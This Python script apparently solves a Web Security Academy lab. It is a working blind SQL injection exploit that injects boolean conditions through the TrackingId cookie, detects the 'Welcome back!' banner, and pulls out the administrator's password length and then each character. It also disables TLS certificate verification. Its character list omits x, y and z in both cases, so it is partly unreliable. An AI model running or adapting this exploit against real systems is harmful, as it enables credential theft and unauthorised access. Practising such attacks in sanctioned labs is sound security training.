import http.client
import re
import ssl

LAB_ID = "???"


def GET_(
        tracking_id: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    if tracking_id:
        headers['cookie'] = f'TrackingId={tracking_id}'
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def tracking_id() -> str:
    response = GET_()
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'TrackingId=([a-zA-Z0-9]+);', cookie_header)[0]


welcome = 'Welcome back!'
response = GET_()
if welcome in response.read().decode('utf-8'):
    raise Exception
tracking_cookie = tracking_id()
response = GET_(tracking_cookie)
if welcome not in response.read().decode('utf-8'):
    raise Exception
response = GET_(f"""{tracking_cookie}' AND '1'='1'--""")
if welcome not in response.read().decode('utf-8'):
    raise Exception
response = GET_(f"""{tracking_cookie}' AND '1'='2'--""")
if welcome in response.read().decode('utf-8'):
    raise Exception
print("passed sanity check")


def evaluate(query: str) -> bool:
    response = GET_(f"""{tracking_cookie}' AND {query}--""")
    if response.status != 200:
        raise Exception(f"Response status: {response.status}")
    return welcome in response.read().decode('utf-8')


password_length = None
for i in range(100):
    if evaluate(f"exists(" +
                f"select 1 from users " +
                f"where username='administrator' " +
                f"and length(password)={i}" +
                f")"):
        password_length = i
        print(f"found password length: {password_length}")
        break
else:
    raise Exception("couldn't find password length")

characters = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    '~', '`', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '{', '}',
    '[', ']', '|', '\\', '/', ':', ';', '"', '\'', '<', '>', ',', '.', ' ', ',', '?',
]


def char_at(pos: int) -> str:
    print(f"seeking char at {pos}")
    for char in characters:
        if evaluate(f"exists(" +
                    f"select 1 from users " +
                    f"where username='administrator' " +
                    f"and substring(password, {pos + 1}, 1)='{char}'" +
                    f")"):
            return char
    else:
        raise Exception(f"couldn't find char at pos: {pos}")


password = ''.join([char_at(i) for i in range(password_length)])
print(f"found password: {password}")
